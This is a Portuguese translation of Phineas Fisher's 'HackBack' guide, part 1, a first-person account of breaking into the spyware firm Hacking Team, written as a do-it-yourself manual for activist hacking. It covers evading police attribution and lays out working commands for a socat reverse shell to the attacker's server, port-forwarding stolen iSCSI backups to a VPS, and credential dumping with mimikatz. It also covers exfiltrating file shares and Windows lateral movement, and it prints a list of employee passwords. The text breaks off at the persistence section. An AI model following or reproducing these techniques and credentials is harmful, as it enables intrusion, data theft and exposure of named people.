---
title:  'HackBack! Um guia DYI - parte 1'
date:   2016-04-07
categories:
  - Artigo
tags:
  - antisec
  - infosec
  - hackerativismo
  - segurança
  - anarquismo
author:
  - Phineas Fisher
description: 'Nesse mundo, há muitos hackers melhores do que eu, mas eles usam mal seus talentos trabalhando para empreiteiros de "defesa", para agências de inteligência, para proteger bancos e corporações e para defender o status quo. A cultura hacker nasceu nos Estados Unidos como uma contracultura, mas essa origem só permanece em sua estética - o resto foi assimilado. Pelo menos eles podem usar uma camiseta, pintar o cabelo de azul, usar seus nomes de hacker e se sentir como rebeldes enquanto trabalham para o Homem.'
---

```
Traduzido por: Vinicius Yaunner
Revisado por: Cypherpunks Brasil
```
**Nota do Tradutor:** Tem a tem a parte II pra ser traduzida ainda!

# HackBack - Um Guia DIY I
## ataque contra a Hacking Team
## Phineas Fisher


---
                _   _            _      ____             _    _ 
               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
                                                 
                                  Um Guia DIY



                                 ,-._,-._             
                              _,-\  o O_/;            
                             / ,  `     `|            
                             | \-.,___,  /   `        
                              \ `-.__/  /    ,.\      
                             / `-.__.-\`   ./   \'
                            / /|    ___\ ,/      `\
                           ( ( |.-"`   '/\         \  `
                            \ \/      ,,  |          \ _
                             \|     o/o   /           \.
                              \        , /             /
                              ( __`;-;'__`)            \\
                              `//'`   `||`              `\
                             _//       ||           __   _   _ _____   __
                     .-"-._,(__)     .(__).-""-.      | | | | |_   _| |
                    /          \    /           \     | | |_| | | |   |
                    \          /    \           /     | |  _  | | |   |
                     `'-------`      `--------'`    __| |_| |_| |_|   |__
                               #antisec



#antisec
--[ 1 - Introdução ]----------------------------------------------------------

Você notará a mudança no idioma desde a última edição[1]. O mundo que fala inglês já tem muitos livros, palestras, guias e informações sobre hacking. Nesse mundo, há muitos hackers melhores do que eu, mas eles usam mal seus talentos trabalhando para empreiteiros de "defesa", para agências de inteligência, para proteger bancos e corporações e para defender o status quo. A cultura hacker nasceu nos Estados Unidos como uma contracultura, mas essa origem só permanece em sua estética - o resto foi assimilado. Pelo menos eles podem usar uma camiseta, pintar o cabelo de azul, usar seus nomes de hacker e se sentir como rebeldes enquanto trabalham para o Homem.

Você costumava entrar sorrateiramente nos escritórios para vazar documentos[2]. Você costumava precisar de uma arma para roubar um banco. Agora você pode fazer as duas coisas da cama com um laptop nas mãos[3][4]. Como a CNT disse após o hack do Gamma Group: "Vamos dar um passo em frente com novas formas de luta"[5]. Hacking é uma ferramenta poderosa, vamos aprender e lutar!

[1] http://pastebin.com/raw.php?i=cRYvK4jb

[2] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI

[3] http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html

[4] https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf

[5] http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group

--[ 2 - Hacking Team ]----------------------------------------------------------

Hacking Team era uma empresa que ajudava governos a hackear e espionar jornalistas, ativistas, oposição política e outras ameaças ao seu poder[1][2][3][4][5][6][7][8][9][10][11]. E, ocasionalmente, em criminosos e terroristas reais[12]. Vincenzetti, o CEO, gostava de terminar seus e-mails com o slogan fascista "boia chi molla". Seria mais correto dizer "boia chi vende RCS". Eles também alegaram ter tecnologia para resolver o "problema" colocado pelo Tor e a darknet[13]. Mas visto que ainda estou livre, tenho minhas dúvidas sobre sua eficácia.

[1] http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/

[2] http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html

[3] http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/

[4] https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/

[5] https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/

[6] https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/

[7] http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/

[8] http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal

[9] https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/

[10] http://www.wired.com/2013/06/spy-tool-sold-to-governments/

[11] http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/

[12] http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html

[13] http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web

--[ 3 - Fique seguro aí fora ]---------------------------------------------------

Infelizmente, nosso mundo está ao contrário. Você fica rico fazendo coisas ruins e vai para a prisão por fazer coisas boas. Felizmente, graças ao trabalho árduo de pessoas como o projeto Tor[1], você pode evitar ir para a cadeia tomando algumas precauções simples:

1) Criptografe seu disco rígido[2]

   Acho que quando a polícia chega para apreender seu computador, significa que você já cometeu muitos erros, mas é melhor estar seguro.
2) Use a virtual machine with all traffic routed through Tor

   Isso realiza duas coisas. Primeiro, todo o seu tráfego é anônimo por meio do Tor. Em segundo lugar, manter sua vida pessoal e hackers em computadores separados ajuda a não misturá-los acidentalmente.

   Você pode usar projetos como Whonix[3], Tails[4], Qubes TorVM[5] ou algo customizado[6]. Aqui está[7] uma comparação detalhada.
3) (Opcional) Não conecte diretamente ao Tor

   Tor não é uma panacéia. Eles podem correlacionar os tempos em que você está conectado ao Tor com os tempos em que seu hacker está ativo. Além disso, houve ataques bem-sucedidos contra o Tor[8]. Você pode se conectar ao Tor usando o wi-fi de outras pessoas. Wifislax[9] é uma distro Linux com várias ferramentas para crackear wi-fi. Outra opção é conectar-se a uma VPN ou a um nó de ponte[10] antes do Tor, mas isso é menos seguro porque eles ainda podem correlacionar a atividade do hacker com a atividade de Internet de sua casa (isso foi usado como evidência contra Jeremy Hammond[11]).

   A realidade é que, embora o Tor não seja perfeito, ele funciona muito bem. Quando eu era jovem e imprudente, fazia muitas coisas sem nenhuma proteção (estou me referindo a hackear) além do Tor, que a polícia tentou ao máximo investigar e nunca tive problemas.

[1] https://www.torproject.org/

[2] https://info.securityinabox.org/es/chapter-4

[3] https://www.whonix.org/

[4] https://tails.boum.org/

[5] https://www.qubes-os.org/doc/privacy/torvm/

[6] https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy

[7] https://www.whonix.org/wiki/Comparison_with_Others

[8] https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/

[9] http://www.wifislax.com/

[10] https://www.torproject.org/docs/bridges.html.en

[11] http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html

----[ 3.1 - Infraestrutura ]----------------------------------------------------

Eu não ataco diretamente os nós de saída do Tor. Eles estão em listas negras, são lentos e não podem receber reconexões. O Tor protege meu anonimato enquanto eu me conecto à infraestrutura que uso para hackear, que consiste em:

1) Nomes de domínio

   Para endereços C&C e para túneis DNS para saída garantida.
2) Servidores Estáveis

   Para uso como servidores C&C, para receber connect-back shells, para lançar ataques e para armazenar o *loot*.
3) Servidores Hackeados

   Para uso como pivôs para ocultar os endereços IP dos servidores estáveis. E para quando quero uma conexão rápida sem pivotamento, por exemplo para escanear portas, escanear toda a internet, baixar um banco de dados com sqli, etc.

Obviamente, você deve usar um método de pagamento anônimo, como bitcoin (se usado com cuidado).

----[ 3.2 - Atribuição ]-------------------------------------------------------

Nas notícias, frequentemente vemos ataques rastreados até grupos de hackers apoiados pelo governo ("APTs"), porque eles usam repetidamente as mesmas ferramentas, deixam as mesmas pegadas e até usam a mesma infraestrutura (domínios, e-mails, etc). Eles são negligentes porque podem hackear sem consequências legais.

Eu não queria tornar o trabalho da polícia mais fácil relacionando meu hack do Hacking Team com outros hacks que fiz ou com nomes que uso no meu dia-a-dia como hacker *blackhat*. Então, usei novos servidores e nomes de domínio, registrei-me com novos e-mails e paguei com novos endereços bitcoin. Além disso, usei apenas ferramentas que estão disponíveis publicamente ou coisas que escrevi especificamente para esse ataque e mudei minha maneira de fazer algumas coisas para não deixar minha pegada forense usual.

--[ 4 - Coleta de informações ]-------------------------------------------------

Embora possa ser tedioso, esse estágio é muito importante, pois quanto maior a superfície de ataque, mais fácil é encontrar um buraco em algum lugar dela.

----[ 4.1 - Informação Técnica ]---------------------------------------------

Algumas ferramentas e técnicas são:

1) Google

   Muitas coisas interessantes podem ser encontradas com algumas consultas de pesquisa bem escolhidas. Por exemplo, a identidade do DPR[1]. A bíblia do Google hack é o livro *"[Google Hacking for Penetration Testers](https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf)"*. Você pode encontrar um breve resumo em espanhol em[2].
2) Enumeração de Subdomínio

   Frequentemente, o site principal de uma empresa é hospedado por terceiros e você encontrará a faixa de IP real da empresa graças a subdomínios como *mx.company.com* ou *ns1.company.com*. Além disso, às vezes há coisas que não devem ser expostas em subdomínios "ocultos". Ferramentas úteis para descobrir domínios e subdomínios são o feroz[3], theHarvester[4] e o recon-ng[5].
3) Pesquisas no Whois e pesquisas reversas

   Com uma pesquisa reversa usando as informações no whois de um domínio ou faixa de IP de uma empresa, você pode encontrar outros domínios e faixas de IP. Pelo que eu sei, não há maneira gratuita de fazer pesquisas reversas além de um "hack" do Google:
~~~
   "via della moscova 13" site:www.findip-address.com
   "via della moscova 13" site:domaintools.com
~~~
4) Digitalização de portas e impressão digital

   Ao contrário das outras técnicas, esta se comunica com os servidores da empresa. Incluo nesta seção porque não é um ataque, é apenas uma coleta de informações. O IDs da empresa pode gerar um alerta, mas você não precisa se preocupar, pois toda a Internet está sendo varrida constantemente.

   Para digitalização, o nmap[6] é preciso e pode imprimir digitalmente a maioria dos serviços descobertos. Para empresas com faixas de IP muito grandes, zmap[7] ou masscan[8] são rápidos. WhatWeb[9] ou BlindElephant[10] podem fazer impressões digitais em sites.

[1] http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html

[2] http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf

[3] http://ha.ckers.org/fierce/

[4] https://github.com/laramies/theHarvester

[5] https://bitbucket.org/LaNMaSteR53/recon-ng

[6] https://nmap.org/

[7] https://zmap.io/

[8] https://github.com/robertdavidgraham/masscan

[9] http://www.morningstarsecurity.com/research/whatweb

[10] http://blindelephant.sourceforge.net/

----[ 4.2 - Informações Sociais ]------------------------------------------------

Para engenharia social, é útil ter informações sobre os funcionários, suas funções, informações de contato, sistema operacional, navegador, plug-ins, software, etc. Alguns recursos são:

1) Google

   Também aqui, é a ferramenta mais útil.
2) [theHarvester](https://github.com/laramies/theHarvester) e [recon-ng](https://github.com/lanmaster53/recon-ng)

   Já os mencionei na seção anterior, mas eles têm muito mais funcionalidades. Eles podem encontrar muitas informações de forma rápida e automática. Vale a pena ler toda a documentação.
3) LinkedIn

   Muitas informações sobre os funcionários podem ser encontradas aqui. Os recrutadores da empresa são os mais propensos a aceitar suas solicitações de conexão.
4) Data.com

   Anteriormente conhecido como quebra-cabeças. Eles têm informações de contato de muitos funcionários.
5) Metadados de arquivos

   Muitas informações sobre os funcionários e seus sistemas podem ser encontradas em metadados de arquivos que a empresa publicou. Ferramentas úteis para localização de arquivos no site da empresa e extração de metadados são metagoofil[1] e FOCA[2].

[1] https://github.com/laramies/metagoofil

[2] https://www.elevenpaths.com/es/labstools/foca-2/index.html

--[ 5 - Entrando na rede ]--------------------------------------------------

Existem várias maneiras de obter uma posição segura. Como o método que usei contra o Hacking Team é incomum e muito mais trabalhoso do que o normalmente necessário, falarei um pouco sobre as duas formas mais comuns, que recomendo tentar primeiro.

----[ 5.1 - Engenharia social ]------------------------------------------------

A engenharia social, especificamente o spear phishing, é responsável pela maioria dos hacks atualmente. Para uma introdução em espanhol, veja[1]. Para obter mais informações em inglês, consulte[2] (a terceira parte, "Ataques direcionados"). Para histórias divertidas sobre as façanhas de engenharia social das gerações anteriores, consulte[3]. Eu não queria tentar spear phishing na Hacking Team, já que todo o seu negócio é ajudar governos a *spear phishing* seus oponentes, então eles seriam muito mais propensos a reconhecer e investigar uma tentativa de spear phishing.

[1] http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html

[2] http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/

[3] http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf

----[ 5.2 - Comprando Acesso ]-----------------------------------------------------

Graças aos trabalhadores russos e seus kits de exploração, vendedores de tráfego e criadores de bots, muitas empresas já comprometeram os computadores em suas redes. Quase todas as [Fortune 500](https://fortune.com/global500/), com suas enormes redes, já têm alguns bots dentro. No entanto, a Hacking Team é uma empresa muito pequena, e a maioria de seus funcionários são especialistas em infosec, então havia uma pequena chance de que eles já tivessem sido comprometidos.

----[ 5.3 - Technical Exploitation ]--------------------------------------------

Após o [hack do Gamma Group](https://www.zdnet.com/article/top-govt-spyware-company-hacked-gammas-finfisher-leaked/), descrevi um processo de busca de vulnerabilidades[1]. A Hacking Team tinha um intervalo de IP público:

~~~
inetnum:        93.62.139.32 - 93.62.139.47
descr:          HT public subnet
~~~
A Hacking Team teve pouquíssima exposição na internet. Por exemplo, ao contrário do Gamma Group, seu site de suporte ao cliente precisava de um certificado de cliente para se conectar. O que eles tinham era seu site principal (um blog do Joomla no qual o Joomscan[2] não encontrou nada sério), um servidor de e-mail, alguns roteadores, dois dispositivos VPN e um dispositivo de filtragem de spam. Então, eu tinha três opções: procurar um *0-day* no Joomla, procurar um dia 0 no postfix ou procurar um dia 0 em um dos dispositivos embarcados. Um 0-day em um dispositivo embarcado parecia a opção mais fácil e, após duas semanas de trabalho de engenharia reversa, obtive um exploit de root remoto. Uma vez que as vulnerabilidades ainda não foram corrigidas, não vou dar mais detalhes, mas para mais informações sobre como encontrar esses tipos de vulnerabilidades, consulte[3] e[4].

[1] http://pastebin.com/raw.php?i=cRYvK4jb

[2] http://sourceforge.net/projects/joomscan/

[3] http://www.devttys0.com/

[4] https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A

--[ 6 - Esteja preparado ]-----------------------------------------------------------

Fiz muitos trabalhos e testes antes de usar o exploit contra Hacking Team. Eu escrevi um firmware backdoor e compilei várias ferramentas de post-exploitation para o dispositivo embutido. A porta dos fundos serve para proteger o exploit. Usar o exploit apenas uma vez e depois retornar pela porta dos fundos torna mais difícil identificar e corrigir as vulnerabilidades.

As ferramentas post-exploitation que eu preparei foram:

1) busybox

   Para todos os utilitários Unix padrão que o sistema não tinha.
2) nmap

   Para escanear e tirar impressões digitais da rede interna da Hacking Team.
3) Responder.py

   A ferramenta mais útil para atacar redes do Windows quando você tem acesso à rede interna, mas nenhum usuário de domínio.
4) Python

   Para executar o Responder.py
5) tcpdump

   Para farejar o tráfego.
6) dsniff

   Para farejar senhas de protocolos de texto simples como ftp e para arpspoofing. Eu queria usar o ettercap, escrito pelo próprio ALoR e NaGA do Hacking Team, mas foi difícil compilá-lo para o sistema.
7) socat

   Para um *comfortable shell* com um pty:

   ~~~
   my_server: socat file:`tty`,raw,echo=0 tcp-listen:my_port
   hacked box: socat exec:'bash -li',pty,stderr,setsid,sigint,sane
   tcp:my_server:my_port
   ~~~
   E útil para muito mais, é um canivete suíço de rede. Veja a seção de exemplos de sua documentação.
8) screen

   Como o shell com pty, não era realmente necessário, mas eu queria me sentir em casa na rede do Hacking Team.
9) uma SOCKS proxy server

   Para usar com proxychains para poder acessar sua rede local de qualquer programa.
10) tgcd

Para encaminhar portas, como para o servidor SOCKS, através do firewall.

[1] https://www.busybox.net/

[2] https://nmap.org/

[3] https://github.com/SpiderLabs/Responder

[4] https://github.com/bendmorris/static-python

[5] http://www.tcpdump.org/

[6] http://www.monkey.org/~dugsong/dsniff/

[7] http://www.dest-unreach.org/socat/

[8] https://www.gnu.org/software/screen/

[9] http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html

[10] http://tgcd.sourceforge.net/

A pior coisa que poderia acontecer seria meu backdoor ou ferramentas post-exploitation tornar o sistema instável e fazer com que um funcionário investigasse. Então, passei uma semana testando minhas ferramentas de exploit, backdoor e post-exploitation nas redes de outras empresas vulneráveis antes de entrar na rede da Hacking Team.

--[ 7 - Ver e Ouvir ]------------------------------------------------------

Agora, dentro de sua rede interna, eu queria dar uma olhada e pensar sobre meu próximo passo. Iniciei Responder.py em modo de análise (-A para ouvir sem enviar respostas envenenadas) e fiz uma varredura lenta com nmap.

--[ 8 - NoSQL Databases ]-------------------------------------------------------

NoSQL, ou melhor, NoAuthentication, tem sido um grande presente para a comunidade hacker[1]. Apenas quando eu estava preocupado que eles finalmente corrigiram todos os bugs de bypass de autenticação no MySQL[2][3][4][5], novos bancos de dados entraram em estilo que não possuem autenticação por design. O Nmap encontrou alguns na rede interna do Hacking Team:

~~~
27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 47547
|   totalSize = 49856643072
...
|_    version = 2.6.527017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 31987
|   totalSize = 33540800512
|   databases
...
|_    version = 2.6.5
~~~
Eles eram os bancos de dados para instâncias de teste do RCS. O áudio que o RCS grava é armazenado no MongoDB com GridFS. A pasta de áudio no torrent [6] veio disso. Eles estavam espionando a si mesmos sem querer.

[1] https://www.shodan.io/search?query=product%3Amongodb

[2] https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql

[3] http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html

[4] http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c

[5] http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html

[6] https://ht.transparencytoolkit.org/audio/

--[ 9 - Cabos Cruzados ]--------------------------------------------------------

Embora fosse divertido ouvir as gravações e ver as imagens da webcam do Hacking Team desenvolvendo seu malware, não era muito útil. Seus backups inseguros foram a vulnerabilidade que abriu suas portas. De acordo com sua documentação[1], seus dispositivos iSCSI deveriam estar em uma rede separada, mas o nmap encontrou alguns em sua sub-rede 192.168.1.200/24:

~~~
Nmap scan report for ht-synology.hackingteam.local (192.168.200.66)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000-01.com.synology:ht-synology.name
|     Address: 192.168.200.66:3260,0
|_    Authentication: No authentication requiredNmap scan report for synology-backup.hackingteam.local (192.168.200.72)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000-01.com.synology:synology-backup.name
|     Address: 10.0.1.72:3260,0
|     Address: 192.168.200.72:3260,0
|_    Authentication: No authentication required
~~~
O iSCSI precisa de um módulo de kernel e seria difícil compilá-lo para o sistema embarcado. Encaminhei a porta para que pudesse montá-la a partir de um VPS:
~~~
VPS: tgcd -L -p 3260 -q 42838
Embedded system: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838

VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1
~~~
Agora o iSCSI encontra o nome iqn.2000-01.com.synology, mas tem problemas para montá-lo porque pensa que seu IP é 192.168.200.72 em vez de 127.0.0.1

A maneira como resolvi foi:
~~~
iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1
~~~

E agora, depois:
~~~
iscsiadm -m node --targetname=iqn.2000-01.com.synology:synology-backup.name -p 192.168.200.72 --login
~~~

...o arquivo do dispositivo aparece! Nós montamos isso:
~~~
vmfs-fuse -o ro /dev/sdb1 /mnt/tmp
~~~

e encontrar backups de várias máquinas virtuais. O servidor Exchange parecia o mais interessante. Era muito grande para baixar, mas foi possível montá-lo remotamente para procurar arquivos interessantes:
~~~
$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk
$ fdisk -l /dev/loop0
/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFAT
~~~

então o deslocamento é 2048 * 512 = 1048576
~~~
$ losetup -o 1048576 /dev/loop1 /dev/loop0
$ mount -o ro /dev/loop1 /mnt/exchange/
~~~

agora em /mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311
encontramos o disco rígido da VM e o montamos:
~~~
vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/
mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1
~~~
...e finalmente descompactamos a boneca russa e podemos ver todos os arquivos do antigo servidor Exchange em /mnt/part1

[1] https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf

--[ 10 - Bbackups para Domain Admin ]-----------------------------------------

O que mais me interessou no backup foi ver se tinha uma senha ou hash que pudesse ser usada para acessar o servidor live. Usei pwdump, cachedump e lsadump[1] nas seções do registro. lsadump encontrou a senha da conta de serviço besadmin:

~~~
_SC_BlackBerry MDS Connection Service
0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........
~~~

Usei proxychains[2] com o servidor socks no dispositivo embutido e smbclient[3] para verificar a senha:
~~~ 
proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!' 
~~~

Funcionou! A senha para besadmin ainda era válida, e um administrador local. Eu usei meu proxy e o psexec_psh do metasploit[4] para obter uma sessão do meterpreter. Em seguida, migrei para um processo de 64 bits, executei "load kiwi"[5], "creds_wdigest" e recebi um monte de senhas, incluindo o Domain Admin:

~~~
HACKINGTEAM  BESAdmin       bes32678!!!
HACKINGTEAM  Administrator  uu8dd8ndd12!
HACKINGTEAM  c.pozzi        P4ssword      <---- lol excelente sysadmin
HACKINGTEAM  m.romeo        ioLK/(90
HACKINGTEAM  l.guerra       4luc@=.=
HACKINGTEAM  d.martinez     W4tudul3sp
HACKINGTEAM  g.russo        GCBr0s0705!
HACKINGTEAM  a.scarafile    Cd4432996111
HACKINGTEAM  r.viscardi     Ht2015!
HACKINGTEAM  a.mino         A!e$$andra
HACKINGTEAM  m.bettini      Ettore&Bella0314
HACKINGTEAM  m.luppi        Blackou7
HACKINGTEAM  s.gallucci     1S9i8m4o!
HACKINGTEAM  d.milan        set!dob66
HACKINGTEAM  w.furlan       Blu3.B3rry!
HACKINGTEAM  d.romualdi     Rd13136f@#
HACKINGTEAM  l.invernizzi   L0r3nz0123!
HACKINGTEAM  e.ciceri       2O2571&2E
HACKINGTEAM  e.rabe         erab@4HT!
~~~

[1] https://github.com/Neohapsis/creddump7

[2] http://proxychains.sourceforge.net/

[3] https://www.samba.org/

[4] http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf

[5] https://github.com/gentilkiwi/mimikatz

--[ 11 - Baixando o e-mail ]-------------------------------------------------

Com a senha do Domain Admin, tenho acesso ao e-mail, coração da empresa. Como cada passo que dou há uma chance de ser detectado, começo a baixar o e-mail antes de continuar a explorar. O Powershell facilita isso[1]. Curiosamente, encontrei um bug no manuseio de datas do Powershell. Depois de baixar os e-mails, demorei mais algumas semanas para obter acesso ao código-fonte e tudo mais, então eu voltava de vez em quando para baixar os novos e-mails. O servidor era italiano, com datas no formato day/month/year. Eu usei:
~~~
-ContentFilter {(Received -ge '05/06/2015') -or (Sent -ge '05/06/2015')}
~~~

com New-MailboxExportRequest para baixar os novos emails (neste caso, todos os emails desde 5 de junho). O problema é que diz que a data é inválida se você tentar um dia maior que 12 (imagino porque nos EUA o mês vem primeiro e você não pode ter um mês acima de 12). Parece que os engenheiros da Microsoft apenas testam seu software com sua própria localidade.

[1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/

--[ 12 - Baixando Arquivos ]----------------------------------------------------

Agora que obtive o Domain Admin, comecei a baixar arquivos compartilhados usando meu proxy e a opção -Tc de smbclient, por exemplo:

~~~
proxychains smbclient '//192.168.1.230/FAE DiskStation'
-U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'
~~~

Eu baixei as pastas Amministrazione, FAE DiskStation e FileServer no torrent assim.

--[ 13 - Introdução à invasão de domínios do Windows ]------------------------------

Antes de continuar com a história dos "weones culiaos" (Hacking Team), devo dar alguns conhecimentos gerais sobre hacking em redes windows.

----[ 13.1 - Movimento Lateral ]-------------------------------------------------

Farei uma breve revisão das diferentes técnicas de propagação em uma rede Windows. As técnicas de execução remota requerem a senha ou hash de um administrador local no destino. De longe, a maneira mais comum de obter essas credenciais é usando mimikatz[1], especialmente sekurlsa::logonpasswords e sekurlsa::msv, nos computadores onde você já tem acesso de administrador. As técnicas para movimento "no local" também requerem privilégios administrativos (exceto para runas). As ferramentas mais importantes para escalonamento de privilégios são PowerUp[2] e bypassuac[3].

[1] https://adsecurity.org/?page_id=1821

[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1

Movimento Remoto:

1) psexec

   O método testado e comprovado para movimento lateral em Windows. Você pode usar psexec[1], winexe[2], metasploit's psexec_psh[3], Powershell Empire's invoke_psexec[4] ou o comando interno do Windows "sc"[5]. Para o módulo metasploit, powershell impire e pth-winexe[6], você só precisa do hash, não da senha. É o método mais universal (funciona em qualquer computador Windows com a porta 445 aberta), mas também é menos furtivo. O tipo de evento 7045 "Service Control Manager" aparecerá nos logs de eventos. Em minha experiência, ninguém nunca percebeu durante um hack, mas ajuda os investigadores a descobrir o que o hacker fez depois.

2) WMI

   O método mais furtivo. O serviço WMI é habilitado em todos os computadores Windows, mas exceto para servidores, o firewall o bloqueia por padrão. Você pode usar wmiexec.py[7], pth-wmis[6] (aqui está uma demonstração de wmiexec e pth-wmis[8]), invoke_wmi do Powershell Empire[9] ou o windows embutido wmic[5]. Todos, exceto wmic, só precisam do hash.

3) PSRemoting[10]

   Ele está desabilitado por padrão e não recomendo habilitar novos protocolos. Mas, se o sysadmin já o habilitou, é muito conveniente, especialmente se você usar o PowerShell para tudo (e você deve usar o PowerShell para quase tudo, ele mudará[11] com o PowerShell 5 e Windows 10, mas por enquanto o PowerShell o torna fácil de fazer tudo na RAM, evite AV e deixe uma pequena pegada)

4) Scheduled Tasks

   Você pode executar programas remotos com AT e schtasks[5]. Ele funciona nas mesmas situações em que você poderia usar psexec, e também deixa uma marca conhecida[12].

5) GPO

   Se todos esses protocolos forem desabilitados ou bloqueados pelo firewall, uma vez que você seja o Domain Admin, você pode usar o GPO para dar aos usuários um script de login, instalar um msi, executar uma tarefa agendada[13], ou, como veremos com no computador de Mauro Romeo (um dos administradores de sistema do Hacking Team), use o GPO para habilitar o WMI e abrir o firewall. 

[1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx

[2] https://sourceforge.net/projects/winexe/

[3] https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh

[4] http://www.powershellempire.com/?page_id=523

[5] http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/

[6] https://github.com/byt3bl33d3r/pth-toolkit

[7] https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py

[8] https://www.trustedsec.com/june-2015/no_psexec_needed/

[9] http://www.powershellempire.com/?page_id=124

[10] http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/

[11] https://adsecurity.org/?p=2277

[12] https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems

[13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py

Movimento "in plac":

1) Roubo de Token

   Depois de ter acesso de administrador em um computador, você pode usar os tokens dos outros usuários para acessar recursos no domínio. Duas ferramentas para fazer isso são incógnito[1] e os comandos mimikatz token::*[2].

2) MS14-068

   Você pode tirar vantagem de um bug de validação no Kerberos para gerar tíquetes de Domain Admin[3][4][5].

3) Passe o Hash

   Se você tem um hash de usuário, mas ele não está logado, você pode usar sekurlsa::pth[2] para obter um ticket para o usuário.

4) Injeção de Processos

   Qualquer RAT pode se injetar em outros processos. Por exemplo, o comando migrate em meterpreter e pupy[6], ou o comando psinject[7] em powershell empire. Você pode injetar no processo o token desejado.

5) runas

   Isso às vezes é muito útil, pois não requer privilégios de administrador. O comando faz parte do Windows, mas se você não tiver uma GUI, pode usar o PowerShell[8].

[1] https://www.indetectables.net/viewtopic.php?p=211165

[2] https://adsecurity.org/?page_id=1821

[3] https://github.com/bidord/pykek

[4] https://adsecurity.org/?p=676

[5] http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html

[6] https://github.com/n1nj4sec/pupy

[7] http://www.powershellempire.com/?page_id=273

[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1

----[ 13.2 - Persistência ]------------------------------------------------------

